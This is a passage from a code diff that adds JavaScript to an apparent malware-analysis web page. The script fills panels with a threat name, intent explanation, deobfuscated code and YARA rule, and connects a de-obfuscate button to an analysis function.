+    advName.textContent = data.threat_name;
+  }
+
+  var advIntent = document.getElementById('adv-intent');
+  if (advIntent && data.intent_explanation) {
+    advIntent.textContent = data.intent_explanation;
+  }
+
+  // Deobfuscated code → code inspector pane
+  var codeEl = document.getElementById('adv-deobfuscated-code');
+  if (codeEl && data.deobfuscated_code) {
+    codeEl.textContent = data.deobfuscated_code;
+  }
+
+  // YARA rule → YARA panel <pre>
+  var yaraEl = document.getElementById('adv-yara-rule');
+  if (yaraEl && data.yara_rule) {
+    yaraEl.textContent = data.yara_rule;
+  }
+}
+
+// ─── Wire De-obfuscate Button → analyzeScript ────────────────────────
+document.getElementById('deobfuscate-btn')?.addEventListener('click', function() {
+  var codePane = document.getElementById('raw-script-code');
+  if (codePane) {
+    analyzeScript(codePane.textContent);
+  }
+});
+</script>
+
+</body></html>
